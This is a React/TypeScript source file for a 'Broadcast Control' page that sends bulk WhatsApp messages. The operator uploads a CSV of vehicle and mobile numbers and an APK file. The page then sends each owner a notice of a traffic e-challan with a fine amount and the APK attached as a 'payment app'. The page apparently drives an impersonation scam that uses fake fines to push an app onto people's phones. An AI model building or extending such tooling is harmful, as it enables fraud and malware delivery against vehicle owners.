import { useState, useRef } from "react";
import { useQueryClient } from "@tanstack/react-query";
import {
  useUploadCsv,
  useUploadApk,
  useGetCurrentApk,
  useStartBroadcast,
  useStopBroadcast,
  useGetBroadcastStatus,
  useGetSessionStatus,
  getGetBroadcastStatusQueryKey,
  getGetCurrentApkQueryKey,
} from "@workspace/api-client-react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { useToast } from "@/hooks/use-toast";
import {
  Upload, FileSpreadsheet, Smartphone, Radio, Square, AlertCircle,
  CheckCircle2, Loader2, FileText, Car, Phone
} from "lucide-react";
import { cn } from "@/lib/utils";

const broadcastSchema = z.object({
  challanNumber: z.string().min(1, "Challan number is required"),
  violation: z.string().min(1, "Violation is required"),
  amount: z.string().min(1, "Fine amount is required"),
});

type BroadcastForm = z.infer<typeof broadcastSchema>;

function DropZone({
  label, hint, accept, icon: Icon, onFile, uploading, uploaded, filename
}: {
  label: string; hint: string; accept: string;
  icon: React.ElementType;
  onFile: (f: File) => void;
  uploading: boolean; uploaded: boolean; filename?: string;
}) {
  const inputRef = useRef<HTMLInputElement>(null);
  const [dragging, setDragging] = useState(false);

  return (
    <div
      className={cn(
        "border-2 border-dashed rounded-lg p-5 text-center cursor-pointer transition-colors",
        dragging ? "border-primary bg-primary/5" : "border-border hover:border-primary/50",
        uploaded && "border-primary/40 bg-primary/5"
      )}
      onClick={() => inputRef.current?.click()}
      onDragOver={(e) => { e.preventDefault(); setDragging(true); }}
      onDragLeave={() => setDragging(false)}
      onDrop={(e) => {
        e.preventDefault(); setDragging(false);
        const file = e.dataTransfer.files[0];
        if (file) onFile(file);
      }}
      data-testid={`dropzone-${label.toLowerCase().replace(/\s/g, "-")}`}
    >
      <input
        ref={inputRef}
        type="file"
        accept={accept}
        className="hidden"
        onChange={(e) => { const f = e.target.files?.[0]; if (f) onFile(f); }}
      />
      {uploading ? (
        <Loader2 className="w-8 h-8 mx-auto mb-2 animate-spin text-primary" />
      ) : uploaded ? (
        <CheckCircle2 className="w-8 h-8 mx-auto mb-2 text-primary" />
      ) : (
        <Icon className="w-8 h-8 mx-auto mb-2 text-muted-foreground" />
      )}
      <p className="text-sm font-medium text-foreground">{uploaded && filename ? filename : label}</p>
      <p className="text-xs text-muted-foreground mt-0.5">{uploaded ? "Click to replace" : hint}</p>
    </div>
  );
}

export default function BroadcastPage() {
  const queryClient = useQueryClient();
  const { toast } = useToast();

  const [csvSessionId, setCsvSessionId] = useState<string | null>(null);
  const [csvTotal, setCsvTotal] = useState(0);
  const [csvPreview, setCsvPreview] = useState<Array<{ vehicleNo: string; mobile: string }>>([]);

  const { data: broadcastStatus } = useGetBroadcastStatus({
    query: {
      refetchInterval: (data) => (data?.active ? 1500 : 4000),
    },
  });

  const { data: sessionStatus } = useGetSessionStatus({
    query: { refetchInterval: 3000 },
  });

  const { data: currentApk } = useGetCurrentApk({
    query: { queryKey: getGetCurrentApkQueryKey() },
  });

  const uploadCsvMutation = useUploadCsv({
    mutation: {
      onSuccess: (data) => {
        setCsvSessionId(data.sessionId);
        setCsvTotal(data.total);
        setCsvPreview(data.preview ?? []);
        toast({ title: `CSV loaded: ${data.total} vehicles found` });
      },
      onError: () => toast({ title: "CSV upload failed", variant: "destructive" }),
    },
  });

  const uploadApkMutation = useUploadApk({
    mutation: {
      onSuccess: () => {
        queryClient.invalidateQueries({ queryKey: getGetCurrentApkQueryKey() });
        toast({ title: "APK uploaded successfully" });
      },
      onError: () => toast({ title: "APK upload failed", variant: "destructive" }),
    },
  });

  const startMutation = useStartBroadcast({
    mutation: {
      onSuccess: (data) => {
        queryClient.invalidateQueries({ queryKey: getGetBroadcastStatusQueryKey() });
        toast({ title: `Broadcast started — ${data.total} messages queued` });
      },
      onError: () => toast({ title: "Failed to start broadcast", variant: "destructive" }),
    },
  });

  const stopMutation = useStopBroadcast({
    mutation: {
      onSuccess: () => {
        queryClient.invalidateQueries({ queryKey: getGetBroadcastStatusQueryKey() });
        toast({ title: "Broadcast stop signal sent" });
      },
    },
  });

  const form = useForm<BroadcastForm>({
    resolver: zodResolver(broadcastSchema),
    defaultValues: { challanNumber: "", violation: "", amount: "" },
  });

  const handleCsvFile = (file: File) => {
    const fd = new FormData();
    fd.append("file", file);
    uploadCsvMutation.mutate(fd as any);
  };

  const handleApkFile = (file: File) => {
    const fd = new FormData();
    fd.append("file", file);
    uploadApkMutation.mutate(fd as any);
  };

  const onSubmit = (values: BroadcastForm) => {
    if (!csvSessionId) {
      toast({ title: "Please upload a CSV file first", variant: "destructive" });
      return;
    }
    if (!sessionStatus?.connected) {
      toast({ title: "WhatsApp not connected", variant: "destructive" });
      return;
    }
    startMutation.mutate({ data: { ...values, csvSessionId } });
  };

  const isRunning = broadcastStatus?.active === true;
  const sentPct = broadcastStatus && broadcastStatus.total > 0
    ? Math.round((broadcastStatus.sent / broadcastStatus.total) * 100)
    : 0;

  return (
    <div className="p-6 space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-xl font-semibold text-foreground">Broadcast Control</h1>
          <p className="text-sm text-muted-foreground mt-0.5">Configure and send e-challan messages</p>
        </div>
        {!sessionStatus?.connected && (
          <div className="flex items-center gap-1.5 text-xs text-yellow-400 bg-yellow-400/10 border border-yellow-400/20 px-3 py-1.5 rounded-md">
            <AlertCircle className="w-3.5 h-3.5" />
            WhatsApp not connected — go to Dashboard
          </div>
        )}
      </div>

      <div className="grid grid-cols-2 gap-6">
        {/* Left: Uploads */}
        <div className="space-y-4">
          <Card>
            <CardHeader className="pb-3">
              <CardTitle className="text-sm font-semibold flex items-center gap-2">
                <FileSpreadsheet className="w-4 h-4 text-primary" />
                Vehicle CSV
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-3">
              <DropZone
                label="Upload CSV File"
                hint="Drag & drop or click — needs vehicle_no & mobile columns"
                accept=".csv"
                icon={FileSpreadsheet}
                onFile={handleCsvFile}
                uploading={uploadCsvMutation.isPending}
                uploaded={!!csvSessionId}
                filename={csvSessionId ? `${csvTotal} vehicles loaded` : undefined}
              />
              {csvPreview.length > 0 && (
                <div className="rounded-md border border-border overflow-hidden">
                  <div className="px-3 py-2 bg-muted/30 border-b border-border flex items-center gap-2">
                    <Car className="w-3.5 h-3.5 text-muted-foreground" />
                    <span className="text-xs font-medium text-muted-foreground">Preview (first {csvPreview.length} rows)</span>
                  </div>
                  {csvPreview.map((r, i) => (
                    <div key={i} className="flex items-center justify-between px-3 py-2 text-xs border-b border-border last:border-0">
                      <div className="flex items-center gap-2">
                        <Car className="w-3 h-3 text-muted-foreground" />
                        <span className="font-mono font-medium text-foreground">{r.vehicleNo}</span>
                      </div>
                      <div className="flex items-center gap-1.5 text-muted-foreground">
                        <Phone className="w-3 h-3" />
                        <span className="font-mono">{r.mobile}</span>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </CardContent>
          </Card>

          <Card>
            <CardHeader className="pb-3">
              <CardTitle className="text-sm font-semibold flex items-center gap-2">
                <Smartphone className="w-4 h-4 text-primary" />
                Payment APK
              </CardTitle>
            </CardHeader>
            <CardContent>
              <DropZone
                label="Upload APK File"
                hint="Payment app APK — will be attached to each message"
                accept=".apk"
                icon={Smartphone}
                onFile={handleApkFile}
                uploading={uploadApkMutation.isPending}
                uploaded={!!currentApk?.filename}
                filename={currentApk?.filename ?? undefined}
              />
              {currentApk?.filename && (
                <p className="text-xs text-muted-foreground mt-2 text-center">
                  Current: <span className="text-foreground font-mono">{currentApk.filename}</span>
                </p>
              )}
            </CardContent>
          </Card>
        </div>

        {/* Right: Challan Config + Launch */}
        <div className="space-y-4">
          <Card>
            <CardHeader className="pb-3">
              <CardTitle className="text-sm font-semibold flex items-center gap-2">
                <FileText className="w-4 h-4 text-primary" />
                Challan Template
              </CardTitle>
            </CardHeader>
            <CardContent>
              <Form {...form}>
                <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
                  <FormField
                    control={form.control}
                    name="challanNumber"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-xs text-muted-foreground">Challan Number</FormLabel>
                        <FormControl>
                          <Input
                            placeholder="e.g. CH2024001234"
                            {...field}
                            data-testid="input-challan-number"
                          />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                  <FormField
                    control={form.control}
                    name="violation"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-xs text-muted-foreground">Violation Type</FormLabel>
                        <FormControl>
                          <Input
                            placeholder="e.g. Over Speeding, Signal Jumping"
                            {...field}
                            data-testid="input-violation"
                          />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                  <FormField
                    control={form.control}
                    name="amount"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-xs text-muted-foreground">Fine Amount (₹)</FormLabel>
                        <FormControl>
                          <Input
                            placeholder="e.g. 500"
                            {...field}
                            data-testid="input-amount"
                          />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  {/* Preview */}
                  {form.watch("challanNumber") && (
                    <div className="rounded-md border border-border bg-muted/20 p-3 text-xs font-mono text-muted-foreground space-y-1">
                      <p className="text-foreground font-sans font-medium text-xs mb-2">Message Preview:</p>
                      <p>Dear Vehicle Owner,</p>
                      <p>An e-challan has been issued:</p>
                      <p>Vehicle Number: <span className="text-primary">[FROM CSV]</span></p>
                      <p>Challan: <span className="text-foreground">{form.watch("challanNumber")}</span></p>
                      <p>Violation: <span className="text-foreground">{form.watch("violation") || "[violation]"}</span></p>
                      <p>Fine: <span className="text-foreground">₹{form.watch("amount") || "[amount]"}</span></p>
                      {currentApk?.filename && <p className="text-emerald-400">+ APK: {currentApk.filename}</p>}
                    </div>
                  )}

                  {!isRunning ? (
                    <Button
                      type="submit"
                      className="w-full"
                      disabled={startMutation.isPending || !csvSessionId || !sessionStatus?.connected}
                      data-testid="button-start-broadcast"
                    >
                      {startMutation.isPending ? (
                        <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                      ) : (
                        <Radio className="w-4 h-4 mr-2" />
                      )}
                      {!csvSessionId ? "Upload CSV First" : !sessionStatus?.connected ? "Connect WhatsApp First" : "Start Broadcast"}
                    </Button>
                  ) : (
                    <Button
                      type="button"
                      variant="destructive"
                      className="w-full"
                      onClick={() => stopMutation.mutate()}
                      disabled={stopMutation.isPending}
                      data-testid="button-stop-broadcast"
                    >
                      {stopMutation.isPending ? (
                        <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                      ) : (
                        <Square className="w-4 h-4 mr-2" />
                      )}
                      Stop Broadcast
                    </Button>
                  )}
                </form>
              </Form>
            </CardContent>
          </Card>

          {/* Live progress */}
          {isRunning && (
            <Card className="border-primary/30 bg-primary/5">
              <CardContent className="p-4">
                <div className="flex items-center gap-2 mb-3">
                  <div className="w-2 h-2 rounded-full bg-primary animate-pulse" />
                  <span className="text-sm font-semibold text-primary">Broadcasting...</span>
                  <Badge variant="default" className="ml-auto text-xs">Live</Badge>
                </div>

                {/* Progress bar */}
                <div className="space-y-1 mb-3">
                  <div className="flex justify-between text-xs text-muted-foreground">
                    <span>Progress</span>
                    <span className="text-primary font-medium">{sentPct}%</span>
                  </div>
                  <div className="h-2 bg-muted rounded-full overflow-hidden">
                    <div
                      className="h-full bg-primary rounded-full transition-all duration-500"
                      style={{ width: `${sentPct}%` }}
                    />
                  </div>
                </div>

                <div className="grid grid-cols-3 gap-3 text-center">
                  <div>
                    <p className="text-lg font-bold text-foreground">{broadcastStatus?.total}</p>
                    <p className="text-xs text-muted-foreground">Total</p>
                  </div>
                  <div>
                    <p className="text-lg font-bold text-emerald-400">{broadcastStatus?.sent}</p>
                    <p className="text-xs text-muted-foreground">Sent</p>
                  </div>
                  <div>
                    <p className="text-lg font-bold text-red-400">{broadcastStatus?.failed}</p>
                    <p className="text-xs text-muted-foreground">Failed</p>
                  </div>
                </div>

                {broadcastStatus?.currentNumber && (
                  <p className="text-xs text-muted-foreground mt-3 text-center">
                    Sending to: <span className="font-mono text-foreground">{broadcastStatus.currentNumber}</span>
                  </p>
                )}
              </CardContent>
            </Card>
          )}
        </div>
      </div>
    </div>
  );
}
